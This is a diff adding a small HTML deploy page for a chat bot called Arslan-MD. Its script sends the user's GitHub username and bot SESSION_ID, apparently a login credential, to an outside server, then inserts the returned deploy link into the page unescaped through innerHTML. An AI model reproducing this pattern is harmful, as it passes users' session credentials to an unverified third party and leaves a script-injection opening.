@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Deploy Arslan-MD Bot</title>
+</head>
+<body>
+  <h2>Deploy Your Arslan-MD Bot</h2>
+  <input id="username" placeholder="GitHub Username" />
+  <input id="session" placeholder="Your SESSION_ID" />
+  <button onclick="deploy()">Verify & Deploy</button>
+  <p id="result"></p>
+
+  <script>
+    async function deploy() {
+      const username = document.getElementById("username").value;
+      const session = document.getElementById("session").value;
+
+      const res = await fetch("https://arslan-render-server.onrender.com/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ githubUsername: username, sessionId: session })
+      });
+
+      const data = await res.json();
+      if (data.deploy_link) {
+        document.getElementById("result").innerHTML =
+          `<a href="${data.deploy_link}" target="_blank">🚀 Click to Deploy</a>`;
+      } else {
+        document.getElementById("result").innerText = data.error || "Unknown error";
+      }
+    }
+  </script>
+</body>
+</html>
